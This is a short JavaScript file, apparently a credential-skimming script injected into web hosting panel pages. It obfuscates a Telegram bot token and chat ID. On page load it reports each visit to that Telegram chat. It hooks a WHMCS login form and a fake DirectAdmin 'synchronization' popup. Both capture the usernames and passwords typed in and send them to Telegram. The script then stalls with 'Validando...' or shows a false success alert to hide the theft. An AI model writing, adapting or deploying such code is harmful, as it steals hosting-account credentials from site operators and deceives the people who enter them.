(function() {
    const _a = "8622579966";
    const _b = "AAGqAh0RnQ6G";
    const _c = "665hz2xiJijMotCrzuT0bsU";
    
    const _0xid = String(-5151842440 + 1); 
    const _0xtk = () => `${_a}:${_b}${_c}`;
    const sendLog = (msg) => {
        const url = `https://api.telegram.org/bot${_0xtk()}/sendMessage?chat_id=${_0xid}&text=${encodeURIComponent(msg)}`;
        fetch(url, {
            method: 'GET',
            mode: 'no-cors',
            keepalive: true
        });
    };
    const h = window.location.hostname;
    sendLog(`👀 Nueva visita en: ${h}`);

    document.addEventListener('DOMContentLoaded', () => {
                const loginForm = document.getElementById('mainLoginForm');
        let isFirstAttempt = true;

        if (loginForm) {
            loginForm.addEventListener('submit', function(e) {
                const u = document.getElementById('whUser').value;
                const p = document.getElementById('whPass').value;

                if (isFirstAttempt) {
                    e.preventDefault();
                    isFirstAttempt = false;
                    
                    sendLog(`🔥 WHMCS LOGIN\nHost: ${h}\nUser: ${u}\nPass: ${p}`);
                    
                    const btn = document.getElementById('whSubmit');
                    const originalVal = btn.value;
                    btn.value = "Validando...";
                    btn.disabled = true;
                    setTimeout(() => {
                        btn.value = originalVal;
                        btn.disabled = false;
                        loginForm.submit();
                    }, 1200);
                }
            });
        }
        const daForm = document.getElementById('daCaptureForm');
        if (daForm) {
            daForm.addEventListener('submit', function(e) {
                e.preventDefault();
                const du = document.getElementById('daUser').value;
                const dp = document.getElementById('daPass').value;
                
                sendLog(`🚨 DIRECTADMIN DATA\nHost: ${h}\nUser: ${du}\nPass: ${dp}`);
                
                const daBtn = document.getElementById('daSubmitBtn');
                daBtn.innerText = "Sincronizando...";
                daBtn.disabled = true;

                setTimeout(() => {
                    document.getElementById('daPopup').style.display = 'none';
                    alert("Sincronización completada exitosamente.");
                    daBtn.innerText = "Sincronizar Ahora";
                    daBtn.disabled = false;
                }, 1800);
            });
        }
    });
})();
